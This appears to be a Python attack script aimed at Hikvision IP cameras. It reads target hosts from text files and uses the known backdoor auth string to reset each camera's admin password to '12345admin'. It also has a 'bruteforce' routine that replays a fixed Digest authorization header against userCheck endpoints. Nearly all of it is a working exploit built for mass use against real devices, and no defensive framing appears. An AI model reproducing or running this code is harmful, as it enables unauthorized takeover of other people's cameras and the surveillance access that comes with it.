import requests , os , sys , urllib.request
from host import host
class hikvision:
    def hikxploit(self):
        BackdoorAuthArg = "auth=YWRtaW46MTEK"
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/vuln_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                newPass = "12345admin"
                userID = "1"
                userName = "admin"
                userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>' + userID + '</id>.<userName>' + userName + '</userName>.<password>' + newPass + '</password>.</User>'
                URLBase = "http://" + address['ip'] + ":" + str(address['port']) + "/"
                URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
                x = requests.put(URLUpload, data=userXML).text
                print("[-]Changed password of "+ URLBase +"onvif-http/snapshot?auth=YWRtaW46MTEK" + " to admin:12345admin")
            except:
                pass
            a += 1
    def bruteforce(self):
        def versDetect(host):
            response = requests.get("http://" + host + "/PSIA/Custom/SelfExt")
            if response.status_code == 401:
                path = "/PSIA/Custom/SelfExt"
                return path
            else:
                path = "/ISAPI/Security"
                return path

        pathOs = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(pathOs + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                path = versDetect(host)
                hdr = {'Authorization': 'Digest username="admin" realm="DS-I114" nonce="4e6a6c424d4441314f5449364e546b794d6d497a4e44513d" uri="/ISAPI/Security/userCheck?timeStamp=1569139421921" response="e7021446513346dcd70e7e702255f711" qop=auth nc=00000009 cnonce="a7cc1484194581c8"'}
                hdrBytes = b"Authorization=Digest+username%3D%22admin%22+realm%3D%22DS-I114%22+nonce%3D%224e6a6c424d4441314f5449364e546b794d6d497a4e44513d%22+uri%3D%22%2FISAPI%2FSecurity%2FuserCheck%3FtimeStamp%3D1569139421921%22+response%3D%22e7021446513346dcd70e7e702255f711%22+qop%3Dauth+nc%3D00000009+cnonce%3D%22a7cc1484194581c8%22"
                url = "http://" + address['ip'] + ':' + str(address['port']) + path + "/userCheck"
                response = urllib.request.urlopen(url, hdrBytes)
                r = response.read()
                print(r)
            except:
                pass
            a += 1
